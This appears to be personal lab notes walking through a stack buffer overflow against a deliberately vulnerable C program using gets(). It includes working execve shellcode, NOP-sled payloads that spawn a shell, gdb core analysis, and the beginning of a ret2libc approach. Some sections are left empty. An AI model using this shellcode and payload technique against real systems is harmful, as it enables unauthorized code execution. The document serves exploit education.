# &#35; basic stack buffer overflow

#### &#42; setting aslr off & core dump
```bash

$ cat /etc/sysctl.conf
kernel.randomize_va_space=0
kernel.core_pattern = core.%e


$ sudo sysctl -p
kernel.randomize_va_space = 0
kernel.core_pattern = core.%e

```

#### &#42; vulnerable source code
#### strcpy() in vuln_func() : can overwrite rsp & rip ...
```bash

$ cat vulnerable.c
#include <stdio.h>

void vuln_func() {
	char buffer[256];
	gets(&buffer);
	printf("%s\n", buffer);
}

void main(int argc, char *argv[]) {
	vuln_func();
}

# Canary/SSP & NX off because of first exploit
$ gcc -fno-stack-protector -z execstack vulnerable.c -o vulnerable

# previous success
$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"BBBBBBBB"+"\xd8\xe2\xff\xff\xff\x7f"' > payload
$ (cat payload ; cat) | ./vulnerable
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������H1�VH�/bin//shWT_j;X���������������������������������������������������������BBBBBBBB�����
id
uid=1000(user) gid=1000(user) groups=1000(user)


------------------------------------------------------------


$ cat vulnerable.c
#include <stdio.h>

void vuln_func() {
	char buffer[256];
	gets(&buffer);
	printf("%s\n", buffer);
}

void main(int argc, char *argv[]) {
	vuln_func();
}

# Only Canary/SSP off because of newbie exploit
$ gcc -fno-stack-protector  vulnerable.c -o vulnerable
$ checksec --file=./vulnerable
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   67) Symbols	  No	0		1		./vulnerable

$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"BBBBBBBB"+"\xd8\xe2\xff\xff\xff\x7f"' > payload
$ (cat payload ; cat) | ./vulnerable
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������H1�VH�/bin//shWT_j;X���������������������������������������������������������BBBBBBBB�����

segmentation fault (core dumped)


$ gdb -core core.vulnerable -q
[*] 3 commands could not be loaded, run `gef missing` to know why.
[New LWP 2462]
Core was generated by `./vulnerable'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00007fffffffe2d8 in ?? ()
gef➤  x/50xg $rsp-280
0x7fffffffe288:	0x000055555555519b	0x9090909090909090
0x7fffffffe298:	0x9090909090909090	0x9090909090909090
0x7fffffffe2a8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2b8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2c8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2d8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2e8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2f8:	0x9090909090909090	0x9090909090909090
0x7fffffffe308:	0x9090909090909090	0x9090909090909090
0x7fffffffe318:	0x9090909090909090	0x9090909090909090
0x7fffffffe328:	0x9090909090909090	0x9090909090909090
0x7fffffffe338:	0x9090909090909090	0x2fbf4856f6314890
0x7fffffffe348:	0x5768732f2f6e6962	0x050f99583b6a5f54
0x7fffffffe358:	0x9090909090909090	0x9090909090909090
0x7fffffffe368:	0x9090909090909090	0x9090909090909090
0x7fffffffe378:	0x9090909090909090	0x9090909090909090
0x7fffffffe388:	0x9090909090909090	0x4242424242424242
0x7fffffffe398:	0x00007fffffffe2d8	0x00007fffffffe4a8
0x7fffffffe3a8:	0x0000000100000000	0x0000000000000000
0x7fffffffe3b8:	0x00007ffff7de60b3	0x00007ffff7ffc620
0x7fffffffe3c8:	0x00007fffffffe4a8	0x0000000100000000
0x7fffffffe3d8:	0x000055555555519e	0x00005555555551c0
0x7fffffffe3e8:	0x4019c79755b63c03	0x0000555555555080
0x7fffffffe3f8:	0x00007fffffffe4a0	0x0000000000000000
0x7fffffffe408:	0x0000000000000000	0xbfe6386892363c03
gef➤  quit

# but 0x7fffffffe2d8 is exactly nops address...

------------------------------------------------------------
$ gdb ./vulnerable -q
gef➤  b *main
gef➤  r
gef➤  vmmap
.
.
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]

# It haven't execute(x) permission on the stack, then nops and shellcode is failed.
# Thus we have other way.


```

#### &#42; need to find executable(x) area
```bash
## libc-2.31.so (0x00007ffff7de4000~0x00007ffff7f5c000) area has execute permission.

$ gdb ./vulnerable -q
gef➤  b *main
Breakpoint 1 at 0x119e
gef➤  r
.
.
gef➤  vmmap
0x00007ffff7dbf000 0x00007ffff7de4000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de4000 0x00007ffff7f5c000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5c000 0x00007ffff7fa6000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa6000 0x00007ffff7fa7000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa7000 0x00007ffff7faa000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fad000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
.
.
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

## thus we need to find /bin/sh string and systemI() in libc-2.31.so.

## here is /bin/sh string
gef➤  grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f5c000-0x7ffff7fa6000), permission=r--
  0x7ffff7f765aa - 0x7ffff7f765b1  →   "/bin/sh"
gef➤  x/s 0x7ffff7f765aa
0x7ffff7f765aa:	"/bin/sh"
gef➤  

## here is system()
gef➤  xinfo system
──────────────────────────────────────────────────────────── xinfo: 0x7ffff7e14410 ────────────────────────────────────────────────────────────
Page: 0x00007ffff7de4000  →  0x00007ffff7f5c000 (size=0x178000)
Permissions: r-x
Pathname: /usr/lib/x86_64-linux-gnu/libc-2.31.so
Offset (from page): 0x30410
Inode: 6298917
Segment: .text (0x00007ffff7de4630-0x00007ffff7f5920d)
Offset (from segment): 0x2fde0
Symbol: system
gef➤  x/4i 0x7ffff7e14410
   0x7ffff7e14410 <__libc_system>:	endbr64
   0x7ffff7e14414 <__libc_system+4>:	test   rdi,rdi
   0x7ffff7e14417 <__libc_system+7>:	je     0x7ffff7e14420 <__libc_system+16>
   0x7ffff7e14419 <__libc_system+9>:	jmp    0x7ffff7e13e50 <do_system>
gef➤

```


#### &#42; compile & try to overflow
```bash

```


#### &#42; analysis using gdb(gef)
```bash


```



#### &#42; find exactly offset count
```bash
# find out 256 bytes
$ pwn cyclic -l 0x6361616f
256
$ pwn cyclic -l 0x63616170
260

```

#### &#42; make shellcode
#### link : <https://github.com/pwn4all/pwn/blob/master/make-shellcode.md/>
```bash
$ cat shell.s
global _start
section .text
_start:
  xor rsi,rsi			; rsi = 0
  push rsi			; push null(0x0) on stack
  mov rdi,0x68732f2f6e69622f
  push rdi			; push /bin/sh on stack
  push rsp			; push &/bin/sh\0
  pop rdi			; rdi = &/bin/sh\0
  push 59			; call sys_execve
  pop rax			; rax = 0
  cdq
  syscall

shell$ nasm -f elf64 shell.s -o shell.o
shell$ ld shell.o -o shell
shell$ ./shell
$ exit

shell$ echo "\"$(objdump -d ./shell | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```

#### &#42; assemble payload
#### buf[256] + rbp[8] + ret/rip[8]
#### => nops[177] + shellcode[23] + nops[56] + dummy[8] + addr_shellcode
```bash
python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"B"*8+"C"*6' > payload

```

#### &#42; find target memory address
```bash
$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"B"*8+"C"*6' > payload

$ gdb ./vulnerable -q


# find nops address(0x7fffffffe280) for shellcode

```


#### &#42; try to exploit
#### if you failed exploit > use core debugging > need to exactly find nops address for shellcode
```bash
$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"BBBBBBBB"+"\x80\xe2\xff\xff\xff\x7f"' > payload
user@pwn:~/aslr/nx-gets$ (cat payload ; cat) | ./vulnerable
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������H1�VH�/bin//shWT_j;X���������������������������������������������������������BBBBBBBB�����
id
segmentation fault (core dumped)


$ gdb -core core.vulnerable -q
gef➤  x/50xg $rsp-280
0x7fffffffe298:	0x000055555555519b	0x9090909090909090
0x7fffffffe2a8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2b8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2c8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2d8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2e8:	0x9090909090909090	0x9090909090909090
0x7fffffffe2f8:	0x9090909090909090	0x9090909090909090
0x7fffffffe308:	0x9090909090909090	0x9090909090909090
0x7fffffffe318:	0x9090909090909090	0x9090909090909090
0x7fffffffe328:	0x9090909090909090	0x9090909090909090
0x7fffffffe338:	0x9090909090909090	0x9090909090909090
0x7fffffffe348:	0x9090909090909090	0x2fbf4856f6314890
0x7fffffffe358:	0x5768732f2f6e6962	0x050f99583b6a5f54
0x7fffffffe368:	0x9090909090909090	0x9090909090909090
0x7fffffffe378:	0x9090909090909090	0x9090909090909090
0x7fffffffe388:	0x9090909090909090	0x9090909090909090
0x7fffffffe398:	0x9090909090909090	0x4242424242424242
0x7fffffffe3a8:	0x00007fffffffe280	0x00007fffffffe4b8
0x7fffffffe3b8:	0x0000000100000000	0x0000000000000000
0x7fffffffe3c8:	0x00007ffff7de60b3	0x00007ffff7ffc620
0x7fffffffe3d8:	0x00007fffffffe4b8	0x0000000100000000
0x7fffffffe3e8:	0x000055555555519e	0x00005555555551c0
0x7fffffffe3f8:	0xb757adae75d46c23	0x0000555555555080
0x7fffffffe408:	0x00007fffffffe4b0	0x0000000000000000
0x7fffffffe418:	0x0000000000000000	0x48a85251b2746c23
gef➤

# change nops address to 0x7fffffffe2d8

$ python -c 'print "\x90"*177+"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"+"\x90"*56+"BBBBBBBB"+"\xd8\xe2\xff\xff\xff\x7f"' > payload
$ (cat payload ; cat) | ./vulnerable
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������H1�VH�/bin//shWT_j;X���������������������������������������������������������BBBBBBBB�����
id
uid=1000(user) gid=1000(user) groups=1000(user)

```

